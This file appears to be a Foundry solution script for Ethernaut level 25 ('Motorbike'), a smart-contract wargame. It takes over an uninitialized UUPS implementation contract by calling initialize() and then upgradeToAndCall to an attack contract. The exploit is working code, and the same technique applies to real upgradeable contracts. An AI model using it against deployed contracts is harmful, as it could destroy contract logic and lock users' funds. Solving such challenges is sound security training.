// SPDX-License-Identifier: UNLICENSED

pragma solidity <0.7.0;

import {Script, console2} from "forge-std/Script.sol";
import {IEthernaut} from "../interfaces/IEthernaut.sol";
import {Motorbike, Engine} from "../src/Level25.sol";
import {Attack} from "../src/Level25Attack.sol";

contract Level25 is Script {
    IEthernaut ethernaut = IEthernaut(vm.envAddress("ETHERNAUT_ADDR"));
    address me = vm.addr(vm.envUint("PRIVATE_KEY"));

    function run() public {
        address payable instance = payable(vm.envAddress("LVL25_ADDR"));
        bytes32 _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        Engine engine = Engine(address(uint160(uint256(vm.load(instance, _IMPLEMENTATION_SLOT)))));

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        Attack attack = new Attack();

        //we can initialize twice because constructor use delecatecall so for engine contract "initializer" is never called
        engine.initialize();
        //Now we are "upgrader" of the engine contract
        engine.upgradeToAndCall(address(attack), abi.encodeWithSignature("attack()"));
        console2.log(address(uint160(uint256(vm.load(instance, _IMPLEMENTATION_SLOT)))));
        console2.log(address(attack));

        if (address(uint160(uint256(vm.load(address(engine), _IMPLEMENTATION_SLOT)))) == address(attack)) {
            console2.log("Success");
            ethernaut.submitLevelInstance(instance);
        }

        vm.stopBroadcast();
    }
}
